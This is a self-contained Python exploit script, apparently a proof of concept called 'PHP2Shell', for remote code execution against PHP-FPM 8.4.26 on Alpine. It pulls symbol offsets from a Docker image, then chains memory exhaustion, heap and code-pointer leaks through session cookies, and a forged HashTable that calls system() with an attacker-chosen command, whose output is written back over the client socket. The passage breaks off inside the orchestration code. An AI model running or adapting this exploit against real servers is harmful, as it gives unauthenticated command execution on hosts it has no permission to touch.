#!/usr/bin/env python3
"""Self-contained auto-calibrating PoC for the PHP2Shell.

Extracts code offsets from a Docker image, then runs the four-stage exploit:

  1. EXHAUST   OOM via nested multipart field names
  2. HEAP LEAK Pipelined consumers race for the poisoned worker
  3. CODE LEAK Second producer/consumer batch discloses zval_ptr_dtor
  4. CALLBACK  Forged HashTable triggers zif_system with our command

    # Defaults (Alpine x86-64, 4 workers, 128 MiB memory_limit):
    python poc3.py --url http://127.0.0.1:18166/index.php \\
                   --image php:8.4.26-fpm-alpine3.23

    # Override heap layout for a different setup:
    python poc3.py --url http://127.0.0.1:18166/index.php \\
                   --image php:8.4.26-fpm-alpine3.23 \\
                   --heap-carrier-delta 0x8400000 \\
                   --heap-carrier-offset 0x16D1D8

    # Override everything for an ARM64 target:
    python poc3.py --url http://127.0.0.1:18166/index.php \\
                   --image php:8.4.26-fpm-alpine3.23 \\
                   --heap-min 0x0000400000000000 --heap-max 0x0000800000000000 \\
                   --code-min 0x0000400000000000 --code-max 0x0000800000000000 \\
                   --heap-depth 57 --heap-count 950 \\
                   --code-depth 58 --code-count 935

Requires Docker (for image analysis) and Python 3.11+.  Standard library only.
"""

from __future__ import annotations

import argparse
import collections
import datetime as dt
import hashlib
import http.client
import json
import os
import re
import secrets
import shutil
import socket
import ssl
import struct
import subprocess
import sys
import tempfile
import urllib.parse
from collections.abc import Callable
from dataclasses import dataclass
from pathlib import Path

# ═══════════════════════════════════════════════════════════════════════════════
# OFFSET CALCULATOR
# ═══════════════════════════════════════════════════════════════════════════════

# ── Calculator constants ────────────────────────────────────────────────────

CHUNK_BITS = 21
CHUNK_MASK = (1 << CHUNK_BITS) - 1  # 0x1FFFFF — low bits ASLR doesn't move

REQUIRED_SYMBOLS = {
    "zval_ptr_dtor": "destructor pointer leaked via session cookie",
    "zif_system":    "target for forged pDestructor (PHP system())",
}

OPTIONAL_SYMBOLS = {
    "zif_exec":       "PHP exec()",
    "zif_passthru":   "PHP passthru()",
    "zif_shell_exec": "PHP shell_exec()",
    "zif_popen":      "PHP popen()",
    "php_exec":       "underlying exec implementation",
}

ALL_SYMBOLS = set(REQUIRED_SYMBOLS) | set(OPTIONAL_SYMBOLS)

# PHP function names whose zif_ handler we want to find via ELF scanning.
ELF_SCAN_TARGETS: dict[bytes, str] = {
    b"system\x00":     "zif_system",
    b"exec\x00":       "zif_exec",
    b"passthru\x00":   "zif_passthru",
    b"shell_exec\x00": "zif_shell_exec",
    b"popen\x00":      "zif_popen",
}


# ── Subprocess / logging helpers ────────────────────────────────────────────

def run_cmd(cmd: list[str], **kw) -> tuple[int, str, str]:
    r = subprocess.run(cmd, capture_output=True, text=True, **kw)
    return r.returncode, r.stdout, r.stderr


def log(msg: str) -> None:
    print(msg, file=sys.stderr, flush=True)


def format_hex(value: int) -> str:
    """Signed-aware hex: positive -> 0x…, negative -> -0x…"""
    return f"-0x{abs(value):X}" if value < 0 else f"0x{value:X}"


# ── ELF parser (64-bit little-endian only) ──────────────────────────────────

@dataclass
class ElfSection:
    name: str
    vaddr: int
    file_offset: int
    size: int
    sh_type: int
    sh_flags: int


def parse_elf_sections(data: bytes) -> list[ElfSection]:
    if data[:4] != b"\x7fELF":
        raise ValueError("Not an ELF file")
    if data[4] != 2:
        raise ValueError("Only 64-bit ELF is supported")
    if data[5] != 1:
        raise ValueError("Only little-endian ELF is supported")

    e_shoff     = struct.unpack_from("<Q", data, 40)[0]
    e_shentsize = struct.unpack_from("<H", data, 58)[0]
    e_shnum     = struct.unpack_from("<H", data, 60)[0]
    e_shstrndx  = struct.unpack_from("<H", data, 62)[0]

    if e_shnum == 0 or e_shoff == 0:
        return []

    strtab_hdr = e_shoff + e_shstrndx * e_shentsize
    strtab_off  = struct.unpack_from("<Q", data, strtab_hdr + 24)[0]
    strtab_size = struct.unpack_from("<Q", data, strtab_hdr + 32)[0]
    strtab = data[strtab_off : strtab_off + strtab_size]

    sections: list[ElfSection] = []
    for i in range(e_shnum):
        base = e_shoff + i * e_shentsize
        sh_name_idx = struct.unpack_from("<I", data, base)[0]
        sh_type     = struct.unpack_from("<I", data, base + 4)[0]
        sh_flags    = struct.unpack_from("<Q", data, base + 8)[0]
        sh_addr     = struct.unpack_from("<Q", data, base + 16)[0]
        sh_offset   = struct.unpack_from("<Q", data, base + 24)[0]
        sh_size     = struct.unpack_from("<Q", data, base + 32)[0]

        nul = strtab.find(b"\x00", sh_name_idx)
        name = strtab[sh_name_idx : nul].decode("ascii", errors="replace")
        sections.append(ElfSection(name, sh_addr, sh_offset, sh_size, sh_type, sh_flags))

    return sections


def _section_by_name(sections: list[ElfSection], name: str) -> ElfSection | None:
    return next((s for s in sections if s.name == name), None)


# ── ELF binary scan for zend_function_entry tables ─────────────────────────

def scan_elf_function_entries(binary: Path) -> dict[str, int]:
    """Scan the ELF for PHP function entry tables.  Returns {name: vaddr}."""
    data = binary.read_bytes()

    try:
        sections = parse_elf_sections(data)
    except ValueError as exc:
        log(f"  [elf-scan] {exc}")
        return {}

    text    = _section_by_name(sections, ".text")
    rodata  = _section_by_name(sections, ".rodata")
    drelro  = _section_by_name(sections, ".data.rel.ro")

    if not text or not rodata:
        log("  [elf-scan] missing .text or .rodata — cannot scan")
        return {}

    string_sections = [s for s in [rodata] if s]
    entry_sections = [s for s in [drelro, _section_by_name(sections, ".data")] if s]

    if not entry_sections:
        log("  [elf-scan] no .data.rel.ro or .data section — cannot scan")
        return {}

    def in_text(va: int) -> bool:
        return text.vaddr <= va < text.vaddr + text.size

    def fo_to_va(sect: ElfSection, fo: int) -> int:
        return fo - sect.file_offset + sect.vaddr

    symbols: dict[str, int] = {}

    for target_bytes, sym_name in ELF_SCAN_TARGETS.items():
        string_vas: list[int] = []
        pos = 0
        while True:
            pos = data.find(target_bytes, pos)
            if pos == -1:
                break
            if pos == 0 or data[pos - 1 : pos] == b"\x00":
                for ss in string_sections:
                    if ss.file_offset <= pos < ss.file_offset + ss.size:
                        string_vas.append(fo_to_va(ss, pos))
                        break
            pos += 1

        if not string_vas:
            continue

        for str_va in string_vas:
            packed = struct.pack("<Q", str_va)
            for es in entry_sections:
                start = es.file_offset
                end   = es.file_offset + es.size
                ref = start
                while ref < end:
                    ref = data.find(packed, ref, end)
                    if ref == -1:
                        break
                    if ref + 32 <= len(data):
                        handler  = struct.unpack_from("<Q", data, ref + 8)[0]
                        num_args = struct.unpack_from("<I", data, ref + 24)[0]
                        if in_text(handler) and num_args <= 20:
                            symbols[sym_name] = handler
                    ref += 8

        if sym_name in symbols:
            fn = target_bytes.rstrip(b"\x00").decode()
            log(f"  [elf-scan] {sym_name} (PHP {fn}()) = 0x{symbols[sym_name]:X}")

    return symbols


# ── Symbol extraction via nm / readelf / objdump ────────────────────────────

def _parse_nm(output: str) -> dict[str, int]:
    syms: dict[str, int] = {}
    for line in output.splitlines():
        parts = line.split()
        if len(parts) < 3:
            continue
        try:
            addr = int(parts[0], 16)
        except ValueError:
            continue
        name = parts[2]
        if name in ALL_SYMBOLS and addr > 0:
            syms.setdefault(name, addr)
    return syms


def _parse_readelf(output: str) -> dict[str, int]:
    syms: dict[str, int] = {}
    for line in output.splitlines():
        for name in ALL_SYMBOLS:
            if name not in line:
                continue
            m = re.search(
                r"\b([0-9a-fA-F]{8,16})\b.*\b" + re.escape(name) + r"\b", line
            )
            if m:
                addr = int(m.group(1), 16)
                if addr > 0:
                    syms.setdefault(name, addr)
    return syms


def _parse_objdump(output: str) -> dict[str, int]:
    syms: dict[str, int] = {}
    for line in output.splitlines():
        for name in ALL_SYMBOLS:
            if name not in line:
                continue
            m = re.search(
                r"^([0-9a-fA-F]+)\b.*\b" + re.escape(name) + r"\b", line
            )
            if m:
                addr = int(m.group(1), 16)
                if addr > 0:
                    syms.setdefault(name, addr)
    return syms


def extract_symbols_local(binary: Path) -> dict[str, int]:
    syms: dict[str, int] = {}
    attempts: list[tuple[str, list[list[str]], callable]] = [
        ("nm",      [["nm", "-D"], ["nm"]],                           _parse_nm),
        ("readelf", [["readelf", "--dyn-syms"], ["readelf", "--syms"]], _parse_readelf),
        ("objdump", [["objdump", "-T"], ["objdump", "-t"]],           _parse_objdump),
    ]
    for tool, variants, parser in attempts:
        if not shutil.which(tool):
            log(f"  [{tool}] not in PATH, skipping")
            continue
        for base_cmd in variants:
            rc, out, _ = run_cmd(base_cmd + [str(binary)])
            if rc != 0 or not out:
                continue
            found = parser(out)
            for n, a in found.items():
                syms.setdefault(n, a)
        if syms:
            log(f"  [{tool}] found: {list(syms)}")
    return syms


def extract_symbols_docker(binary: Path) -> dict[str, int]:
    tag = f"php-offset-binutils-{os.getpid()}"
    with tempfile.TemporaryDirectory() as ctx:
        (Path(ctx) / "Dockerfile").write_text(
            "FROM alpine:latest\nRUN apk add --no-cache binutils\n"
        )
        rc, _, err = run_cmd(["docker", "build", "-q", "-t", tag, ctx])
        if rc != 0:
            raise RuntimeError(f"docker build failed: {err.strip()}")

    syms: dict[str, int] = {}
    try:
        for flag in ["-D", ""]:
            cmd = [
                "docker", "run", "--rm",
                "-v", f"{binary.resolve()}:/binary:ro",
                tag, "nm",
            ]
            if flag:
                cmd.append(flag)
            cmd.append("/binary")
            rc, out, _ = run_cmd(cmd)
            if rc == 0 and out:
                for n, a in _parse_nm(out).items():
                    syms.setdefault(n, a)

        if not syms:
            for sect in ["--dyn-syms", "--syms"]:
                cmd = [
                    "docker", "run", "--rm",
                    "-v", f"{binary.resolve()}:/binary:ro",
                    tag, "readelf", sect, "/binary",
                ]
                rc, out, _ = run_cmd(cmd)
                if rc == 0 and out:
                    for n, a in _parse_readelf(out).items():
                        syms.setdefault(n, a)
    finally:
        run_cmd(["docker", "rmi", "-f", tag])

    if syms:
        log(f"  [docker+binutils] found: {list(syms)}")
    return syms


# ── Docker image helpers ────────────────────────────────────────────────────

PHP_BIN_CANDIDATES = [
    "/usr/local/sbin/php-fpm",
    "/usr/local/bin/php",
    "/usr/sbin/php-fpm",
    "/usr/bin/php",
]

SHARED_LIB_GLOBS = [
    "/usr/local/lib/libphp*.so*",
    "/usr/lib/libphp*.so*",
    "/usr/lib/x86_64-linux-gnu/libphp*.so*",
    "/usr/lib/aarch64-linux-gnu/libphp*.so*",
]


def _platform_args(platform: str | None) -> list[str]:
    return ["--platform", platform] if platform else []


def docker_php_version(image: str, platform: str | None = None) -> str | None:
    rc, out, _ = run_cmd(["docker", "run", *_platform_args(platform),
                           "--rm", "--entrypoint", "php", image, "-v"])
    if rc == 0:
        m = re.search(r"PHP (\S+)", out)
        if m:
            return m.group(1)
    return None


def docker_find_php(image: str, platform: str | None = None) -> str:
    pa = _platform_args(platform)
    for name in ["php-fpm", "php"]:
        rc, out, _ = run_cmd(
            ["docker", "run", *pa, "--rm", "--entrypoint", "which", image, name]
        )
        if rc == 0 and out.strip():
            return out.strip()

    for path in PHP_BIN_CANDIDATES:
        rc, _, _ = run_cmd(
            ["docker", "run", *pa, "--rm", "--entrypoint", "test", image, "-f", path]
        )
        if rc == 0:
            return path

    raise RuntimeError(f"Cannot find PHP binary in {image}")


def docker_find_libphp(image: str, platform: str | None = None) -> str | None:
    pa = _platform_args(platform)
    for pattern in SHARED_LIB_GLOBS:
        rc, out, _ = run_cmd([
            "docker", "run", *pa, "--rm", "--entrypoint", "sh", image,
            "-c", f"ls {pattern} 2>/dev/null | head -1",
        ])
        if rc == 0 and out.strip():
            return out.strip()
    return None


def docker_extract(image: str, src_path: str, dest_dir: Path,
                   platform: str | None = None) -> Path:
    cname = f"php-offset-extract-{os.getpid()}"
    try:
        rc, out, err = run_cmd(["docker", "create", *_platform_args(platform),
                                "--name", cname, image, "true"])
        if rc != 0:
            raise RuntimeError(f"docker create: {err.strip()}")
        dest = dest_dir / Path(src_path).name
        rc, _, err = run_cmd(["docker", "cp", f"{cname}:{src_path}", str(dest)])
        if rc != 0:
            raise RuntimeError(f"docker cp {src_path}: {err.strip()}")
        return dest
    finally:
        run_cmd(["docker", "rm", "-f", cname])


# ── Binary analysis ─────────────────────────────────────────────────────────

def analyse_binary(binary: Path, symbols: dict[str, int]) -> dict[str, int]:
    log(f"Extracting symbols from {binary.name} (local tools)...")
    found = extract_symbols_local(binary)
    for n, a in found.items():
        symbols.setdefault(n, a)

    if not found and shutil.which("docker"):
        log(f"Extracting symbols from {binary.name} (docker+binutils)...")
        found = extract_symbols_docker(binary)
        for n, a in found.items():
            symbols.setdefault(n, a)

    missing = [n for n in ELF_SCAN_TARGETS.values() if n not in symbols]
    if missing:
        log(f"Scanning ELF function tables for: {missing}")
        found = scan_elf_function_entries(binary)
        for n, a in found.items():
            symbols.setdefault(n, a)

    return symbols


# ── Offset computation ──────────────────────────────────────────────────────

def compute_offsets(symbols: dict[str, int]) -> dict:
    result: dict = {}
    result["symbols"] = {n: f"0x{a:X}" for n, a in sorted(symbols.items())}

    dtor = symbols.get("zval_ptr_dtor")
    if dtor is None:
        result["error"] = "zval_ptr_dtor not found — cannot compute offsets"
        return result

    result["DTOR_LOW21"] = dtor & CHUNK_MASK
    result["zval_ptr_dtor"] = dtor

    zif = symbols.get("zif_system")
    if zif is None:
        result["error"] = "zif_system not found — cannot compute ZIF_SYSTEM_FROM_DTOR"
        return result

    result["zif_system"] = zif
    result["ZIF_SYSTEM_FROM_DTOR"] = zif - dtor

    alts = {}
    for name in ("zif_exec", "zif_passthru", "zif_shell_exec", "zif_popen"):
        if name in symbols:
            alts[name] = symbols[name] - dtor
    result["alternatives"] = alts

    return result


# ═══════════════════════════════════════════════════════════════════════════════
# EXPLOIT
# ═══════════════════════════════════════════════════════════════════════════════

# ── Calibration defaults ────────────────────────────────────────────────────

PHP_VERSION = "PHP/8.4.26"

COOKIE_BOUNDARY = b"COOKIE-LAB-BOUNDARY"
FINAL_BOUNDARY = b"h" * 10
BODY_LIMIT = 1 << 20
MAX_RESPONSE_BYTES = 1 << 17
CONSUMERS = 8
COOKIE_PAIRS = 1001

MIN_POINTER_AGREEMENT = 4

HEAP_MIN, HEAP_MAX = 0x700000000000, 0x800000000000
CODE_MIN, CODE_MAX = 0x500000000000, 0x700000000000

DTOR_LOW21           = 0x2498C
ZIF_SYSTEM_FROM_DTOR = -0x20CC7C

HEAP_CARRIER_DELTA = 0x8400000
HEAP_CARRIER_OFFSET = 0x16D1D8

CARRIER_SIZE = 384
COMMAND_OFFSET = 0x98
COMMAND_LIMIT = CARRIER_SIZE - COMMAND_OFFSET - 1

ORDINARY_COOKIE_BYTES = 32


# ── Target ──────────────────────────────────────────────────────────────────

@dataclass(frozen=True)
class Target:
    scheme: str
    host: str
    port: int
    path: str

    @property
    def host_header(self) -> str:
        default = 443 if self.scheme == "https" else 80
        return self.host if self.port == default else f"{self.host}:{self.port}"

    def connect(self) -> socket.socket:
        tcp = socket.create_connection((self.host, self.port), timeout=20)
        if self.scheme == "https":
            try:
                tcp = ssl.create_default_context().wrap_socket(
                    tcp, server_hostname=self.host)
            except BaseException:
                tcp.close()
                raise
        tcp.settimeout(20)
        return tcp


def parse_target(url: str) -> Target:
    parsed = urllib.parse.urlsplit(url)
    if parsed.scheme not in ("http", "https") or not parsed.hostname:
        raise ValueError("--url must be an absolute HTTP(S) URL")
    if parsed.username or parsed.password or parsed.query or parsed.fragment:
        raise ValueError("--url cannot contain credentials, query, or fragment")
    return Target(parsed.scheme, parsed.hostname,
                  parsed.port or (443 if parsed.scheme == "https" else 80),
                  parsed.path or "/")


# ── Multipart building blocks ───────────────────────────────────────────────

def sha256(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def multipart_part(boundary: bytes, name: bytes, value: bytes = b"",
                   filename: bytes | None = None) -> bytes:
    header = (b"--" + boundary +
              b'\r\nContent-Disposition: form-data; name="' + name + b'"')
    if filename is not None:
        header += b'; filename="' + filename + b'"'
    return header + b"\r\n\r\n" + value + b"\r\n"


def finish_multipart(parts: list[bytes], boundary: bytes) -> bytes:
    body = b"".join(parts) + b"--" + boundary + b"--\r\n"
    if not 0 < len(body) < BODY_LIMIT:
        raise ValueError(f"Multipart body is outside the 1 MiB cap: {len(body)}")
    return body


# ── Stage 1: exhaust PHP's memory limit ─────────────────────────────────────

@dataclass(frozen=True)
class ProducerShape:
    depth: int
    count: int
    field_count: int
    field_value_size: int


def leak_producer(shape: ProducerShape) -> bytes:
    b = COOKIE_BOUNDARY
    parts = [multipart_part(b, f"p{i:04d}".encode(), b"x" * shape.field_value_size)
             for i in range(shape.field_count)]
    parts += [multipart_part(b, b"PHPSESSID", b"\x00"),
              multipart_part(b, b"PHP_SESSION_UPLOAD_PROGRESS", b"ppp"),
              multipart_part(b, b"f", b"A" * 64, b"a.txt")]
    for i in range(shape.count):
        name = b"f[" + str(i).encode() + b"]" + b"[x]" * shape.depth
        parts.append(multipart_part(b, name, filename=b""))
    return finish_multipart(parts, b)


# ── Stage 2: leak a Zend heap chunk base ────────────────────────────────────

def heap_consumer() -> bytes:
    b = COOKIE_BOUNDARY
    parts = [multipart_part(b, b"PHPSESSID", b"a"),
             multipart_part(b, b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn")]
    for i in range(51):
        value = (f"v{i:04d}".encode() + b"x" * 48)[:48]
        parts.append(multipart_part(b, str(1000 + i).encode(), value))
    parts.append(multipart_part(b, b"1050", b"Z" * 128))
    forged = bytearray(b"A" * 79)
    struct.pack_into("<Q", forged, 0x10, 256)
    forged[0x18] = ord("L")
    parts.append(multipart_part(b, b"1999", bytes(forged)))
    return finish_multipart(parts, b)


def heap_candidate(cookie: bytes) -> int | None:
    if len(cookie) != 256:
        return None
    candidates = []
    for alignment in range(8):
        words = (struct.unpack_from("<Q", cookie, pos)[0]
                 for pos in range(alignment, len(cookie) - 7, 8))
        counts = collections.Counter(value & ~CHUNK_MASK for value in words
                                   if HEAP_MIN <= value < HEAP_MAX)
        if counts:
            base, hits = counts.most_common(1)[0]
            candidates.append((hits, alignment, base))
    if not candidates:
        return None
    hits, _alignment, base = max(candidates)
    return base if hits >= MIN_POINTER_AGREEMENT else None


# ── Stage 3: leak zval_ptr_dtor from the PHP code image ────────────────────

def code_consumer() -> bytes:
    b = COOKIE_BOUNDARY
    parts = [multipart_part(b, b"PHPSESSID", b"a"),
             multipart_part(b, b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn")]
    for i in range(73):
        parts.append(multipart_part(b, f"s{i:04d}".encode(), b"P" * 24))
    for i in range(983 - 73):
        for j in range(16 if i == 69 else 1):
            parts.append(multipart_part(b, f"a{i:04d}[{j}]".encode(), b"x" * 16))
    return finish_multipart(parts, b)


def code_candidate(cookie: bytes) -> int | None:
    if len(cookie) != 16 or struct.unpack_from("<Q", cookie)[0] != 16:
        return None
    value = struct.unpack_from("<Q", cookie, 8)[0]
    if CODE_MIN <= value < CODE_MAX and value & CHUNK_MASK == DTOR_LOW21:
        return value
    return None


# ── Leak stage descriptor ──────────────────────────────────────────────────

@dataclass(frozen=True)
class LeakStage:
    name: str
    producer: ProducerShape
    build_consumer: Callable[[], bytes]
    read_candidate: Callable[[bytes], int | None]
    leak_cookie_bytes: int
    describes: str


STAGES = {
    "heap": LeakStage(
        name="heap",
        producer=ProducerShape(depth=57, count=950, field_count=50,
                               field_value_size=1),
        build_consumer=heap_consumer,
        read_candidate=heap_candidate,
        leak_cookie_bytes=256,
        describes="Zend chunk base",
    ),
    "code": LeakStage(
        name="code",
        producer=ProducerShape(depth=58, count=935, field_count=65,
                               field_value_size=39),
        build_consumer=code_consumer,
        read_candidate=code_candidate,
        leak_cookie_bytes=16,
        describes="zval_ptr_dtor",
    ),
}


# ── Stage 4: forge a HashTable and reach zif_system ─────────────────────────

def fake_hashtable(address: int, zif_system: int, command: bytes) -> bytes:
    if b"\x00" in command:
        raise ValueError("Command cannot contain a NUL byte")
    if len(command) > COMMAND_LIMIT:
        raise ValueError(
            f"Command is {len(command)} bytes; the carrier holds {COMMAND_LIMIT}")

    data = bytearray(CARRIER_SIZE)

    struct.pack_into("<II", data, 0x00, 1, 7)
    struct.pack_into("<II", data, 0x08, 0x10, 0xFFFFFFF8)
    struct.pack_into("<Q", data, 0x10, address + 0x20)
    struct.pack_into("<II", data, 0x18, 1, 1)
    struct.pack_into("<II", data, 0x20, 8, 0)
    struct.pack_into("<Q", data, 0x28, 0)
    struct.pack_into("<Q", data, 0x30, zif_system)

    struct.pack_into("<Q", data, 0x20, 0)
    struct.pack_into("<Q", data, 0x30, zif_system)
    struct.pack_into("<I", data, 0x4C, 1)
    struct.pack_into("<Q", data, 0x70, address + 0x80)
    struct.pack_into("<I", data, 0x78, 6)

    struct.pack_into("<II", data, 0x80, 1, 0x106)
    struct.pack_into("<Q", data, 0x90, len(command))
    data[COMMAND_OFFSET:COMMAND_OFFSET + len(command)] = command
    data[COMMAND_OFFSET + len(command)] = 0
    return bytes(data)


def final_multipart(heap_base: int, dtor: int, command: bytes) -> bytes:
    if heap_base & CHUNK_MASK or not HEAP_MIN <= heap_base < HEAP_MAX:
        raise ValueError("Heap address is not a plausible aligned Zend chunk")
    if not (CODE_MIN <= dtor < CODE_MAX and dtor & CHUNK_MASK == DTOR_LOW21):
        raise ValueError("Code address does not match the calibrated Alpine layout")

    target = heap_base - HEAP_CARRIER_DELTA + HEAP_CARRIER_OFFSET
    forged = fake_hashtable(target, dtor + ZIF_SYSTEM_FROM_DTOR, command)

    b = FINAL_BOUNDARY
    parts = []
    for i in range(1000):
        name = b"f[" + str(i).encode() + b"]" + b"[x]" * 54
        parts.append(multipart_part(b, name, filename=b""))
    primer = bytearray(b"Q" * 276)
    struct.pack_into("<Q", primer, 13 * 8, target)
    parts += [multipart_part(b, b"", bytes(primer)),
              multipart_part(b, b"a", b"1"),
              multipart_part(b, b"hold", forged),
              multipart_part(b, b"K" * 128000 + b"[x]", b"1")]
    return finish_multipart(parts, b)


def proof_command(nonce: str) -> bytes:
    command = (
        "i=$(awk '$4==\"01\"{print $10;exit}' /proc/net/tcp*);"
        "f=5;for x in /proc/self/fd/*;do "
        "[ \"$(readlink \"$x\")\" = \"socket:[$i]\" ]&&f=${x##*/};done;"
        f'eval "{{ echo {nonce};id;sha256sum \\"$(which test-bin)\\";'
        'test-bin;}>&$f 2>&$f"'
    ).encode("ascii")
    if len(command) > COMMAND_LIMIT:
        raise ValueError("Proof command does not fit the carrier")
    if command.count(b";test-bin;") != 1:
        raise ValueError("Proof command must invoke test-bin exactly once")
    return command


# ── HTTP plumbing ───────────────────────────────────────────────────────────

def cookie_name(index: int) -> str:
    alphabet = "0123456789abcdefghijklmnopqrstuvwxyz"
    return alphabet[(index // 36) % 36] + alphabet[index % 36]


def http_frame(target: Target, body: bytes, boundary: bytes, *,
               cookie_pairs: int = 0, close: bool = True) -> bytes:
    lines = [f"POST {target.path} HTTP/1.1",
             f"Host: {target.host_header}",
             "Connection: close" if close else "Connection: keep-alive",
             f"Content-Length: {len(body)}",
             "Content-Type: multipart/form-data; boundary=" + boundary.decode("ascii")]
    if cookie_pairs:
        lines.append("Cookie: " + "".join(
            cookie_name(i) + "=;" for i in range(cookie_pairs)))
    return ("\r\n".join(lines) + "\r\n\r\n").encode("ascii") + body


def final_http_frame(target: Target, body: bytes) -> bytes:
    lines = [f"POST {target.path} HTTP/1.1",
             f"Host: {target.host_header}",
             "Accept-Encoding: identity",
             f"Content-Length: {len(body)}",
             "Content-Type: multipart/form-data; boundary="
             + FINAL_BOUNDARY.decode("ascii"),
             "Connection: close"]
    return ("\r\n".join(lines) + "\r\n\r\n").encode("ascii") + body


class RecordingReader:
    def __init__(self, reader):
        self.reader = reader
        self.chunks: list[bytes] = []

    def read(self, *args, **kwargs):
        value = self.reader.read(*args, **kwargs)
        self.chunks.append(value)
        return value

    def readline(self, *args, **kwargs):
        value = self.reader.readline(*args, **kwargs)
        self.chunks.append(value)
        return value

    def close(self):
        pass


class SharedSocket:
    def __init__(self, reader):
        self.reader = reader

    def makefile(self, *_args, **_kwargs):
        return self.reader


def receive(shared: SharedSocket) -> tuple[dict, bytes, bytes]:
    response = http.client.HTTPResponse(shared)
    response.begin()
    body = response.read(MAX_RESPONSE_BYTES)
    set_cookie = response.getheader("Set-Cookie") or ""
    encoded = (set_cookie.split("PHPSESSID=", 1)[1].split(";", 1)[0]
               if "PHPSESSID=" in set_cookie else "")
    cookie = urllib.parse.unquote_to_bytes(encoded.replace("+", " "))
    record = {"status": response.status,
              "powered_by": response.getheader("X-Powered-By"),
              "response_bytes": len(body), "body_sha256": sha256(body),
              "oom": b"Allowed memory size" in body and b"exhausted" in body,
              "cookie_bytes": len(cookie)}
    return record, cookie, body


# ── Exploit runner ──────────────────────────────────────────────────────────

def preflight(target: Target) -> None:
    """Check that the target is reachable and returns HTTP 200."""
    cls = (http.client.HTTPSConnection if target.scheme == "https"
           else http.client.HTTPConnection)
    connection = cls(target.host, target.port, timeout=12)
    try:
        connection.request("GET", target.path, headers={"Connection": "close"})
        response = connection.getresponse()
        response.read(4096)
        if response.status != 200:
            raise RuntimeError(
                f"Target returned HTTP {response.status}, expected 200")
    finally:
        connection.close()


def run_leak_stage(target: Target, stage: LeakStage, output: Path) -> tuple[int, dict]:
    producer = leak_producer(stage.producer)
    consumer = stage.build_consumer()

    request = http_frame(target, producer, COOKIE_BOUNDARY,
                         cookie_pairs=COOKIE_PAIRS, close=False)
    request += b"".join(http_frame(target, consumer, COOKIE_BOUNDARY,
                                   close=index == CONSUMERS - 1)
                        for index in range(CONSUMERS))
    (output / f"{stage.name}.request.http").write_bytes(request)

    responses: list[dict] = []
    candidates: set[int] = set()
    raw = b""
    try:
        with target.connect() as connection:
            stream = connection.makefile("rb")
            reader = RecordingReader(stream)
            try:
                connection.sendall(request)
                shared = SharedSocket(reader)
                for _ in range(CONSUMERS + 1):
                    record, cookie, _body = receive(shared)
                    responses.append(record)
                    value = stage.read_candidate(cookie)
                    if value is not None:
                        candidates.add(value)
            finally:
                raw = b"".join(reader.chunks)
                stream.close()
    finally:
        (output / f"{stage.name}.response.http").write_bytes(raw)

    result = {"stage": stage.name,
              "producer": responses[0] if responses else None,
              "consumers": responses[1:],
              "candidate_addresses": [hex(x) for x in sorted(candidates)],
              "request_sha256": sha256(request),
              "response_sha256": sha256(raw)}
    (output / f"{stage.name}.json").write_text(json.dumps(result, indent=2) + "\n")

    if len(responses) != CONSUMERS + 1:
        raise RuntimeError(f"{stage.name}: incomplete response batch")
    producer_record = responses[0]
    if (producer_record["status"] != 200
            or producer_record["oom"] is not True):
        raise RuntimeError(f"{stage.name}: producer did not return HTTP 200 OOM")
    allowed = (ORDINARY_COOKIE_BYTES, stage.leak_cookie_bytes)
    for index, consumer_record in enumerate(responses[1:], 1):
        if (consumer_record["status"] != 200
                or consumer_record["cookie_bytes"] not in allowed):
            raise RuntimeError(f"{stage.name}: consumer {index} did not return a valid cookie")
    if len(candidates) != 1:
        raise RuntimeError(
            f"{stage.name}: expected one strict address, found {len(candidates)}")
    return candidates.pop(), result


def final_request(target: Target, heap: int, dtor: int,
                  nonce: str, output: Path) -> dict:
    command = proof_command(nonce)
    body = final_multipart(heap, dtor, command)
    request = final_http_frame(target, body)
    (output / "final.request.http").write_bytes(request)

    raw = b""
    response_body = b""
    status = None
    headers: list[tuple[str, str]] = []
    incomplete = False
    try:
        with target.connect() as connection:
            stream = connection.makefile("rb")
            reader = RecordingReader(stream)
            try:
                connection.sendall(request)
                response = http.client.HTTPResponse(SharedSocket(reader))
                response.begin()
                status = response.status
                headers = response.getheaders()
                try:
                    response_body = response.read(MAX_RESPONSE_BYTES)
                except http.client.IncompleteRead as exc:
                    response_body = exc.partial
                    incomplete = True
            finally:
                raw = b"".join(reader.chunks)
                stream.close()
    finally:
        (output / "final.response.http").write_bytes(raw)
    (output / "final.response.body").write_bytes(response_body)
    (output / "final.response.headers.json").write_text(
        json.dumps({"status": status, "headers": headers}, indent=2) + "\n")

    nonce_seen = nonce.encode() in response_body
    id_seen = re.search(rb"\buid=\d+", response_body) is not None
    binary_hash_seen = re.search(
        rb"\b[0-9a-f]{64}\s+\S*test-bin\b", response_body) is not None
    truncated = len(response_body) >= MAX_RESPONSE_BYTES

    result = {"status": status,
              "nonce_seen": nonce_seen,
              "id_seen": id_seen,
              "binary_hash_seen": binary_hash_seen,
              "response_incomplete": incomplete or truncated,
              "execution_proof_verified": bool(
                  status == 200 and nonce_seen and id_seen and binary_hash_seen
                  and not incomplete and not truncated),
              "request_bytes": len(request), "request_sha256": sha256(request),
              "response_bytes": len(raw), "response_sha256": sha256(raw),
              "response_body_bytes": len(response_body),
              "response_body_sha256": sha256(response_body),
              "response_path": str(output / "final.response.http")}
    (output / "final.json").write_text(json.dumps(result, indent=2) + "\n")
    return result


# ═══════════════════════════════════════════════════════════════════════════════
# ORCHESTRATION
# ═══════════════════════════════════════════════════════════════════════════════

CACHE_DIR = Path(__file__).resolve().parent / "cache"


def _cache_key(image: str, platform: str | None, php_path: str | None) -> str:
    """Readable, filesystem-safe filename from the three calculator inputs.

    Example: php_8.4.26-fpm-alpine3.23__linux_amd64__php-fpm.json
    """
    def sanitise(s: str) -> str:
        return re.sub(r"[^A-Za-z0-9._-]", "_", s)

    parts = [sanitise(image)]
    if platform:
        parts.append(sanitise(platform))
    if php_path:
        parts.append(sanitise(Path(php_path).name))
    return "__".join(parts)


def _cache_load(image: str, platform: str | None,
                php_path: str | None) -> tuple[int, int, str] | None:
    """Return cached (DTOR_LOW21, ZIF_SYSTEM_FROM_DTOR, php_version) or None."""
    path = CACHE_DIR / f"{_cache_key(image, platform, php_path)}.json"
    if not path.is_file():
        return None
    try:
        data = json.loads(path.read_text())
        return data["DTOR_LOW21"], data["ZIF_SYSTEM_FROM_DTOR"], data["php_version"]
    except (KeyError, json.JSONDecodeError, OSError):
        return None


